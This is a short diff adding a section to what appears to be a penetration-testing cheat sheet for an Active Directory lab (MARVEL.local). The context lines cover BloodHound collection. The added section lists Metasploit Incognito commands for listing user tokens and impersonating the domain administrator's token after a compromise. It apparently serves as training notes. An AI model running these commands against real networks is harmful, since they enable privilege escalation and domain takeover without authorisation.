@@ -106,3 +106,20 @@ Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.z
 # Copy file.zip to hacking box with bloodhound open, and upload file.zip to bloodhound
 # Select hamburger icon on left top to start looking at imported data.
 ```
+
+### Post Compromise Attacks
+#### Token Impersonation with Incognito
+```
+# With a metasploit shell
+load incognito
+
+# To see incognito commands
+help
+
+# List user tokens present on the system
+list_tokens -u
+
+# Impersonate the token using a \\ for character escaping
+impersonate_token marvel\\administrator
+```
+
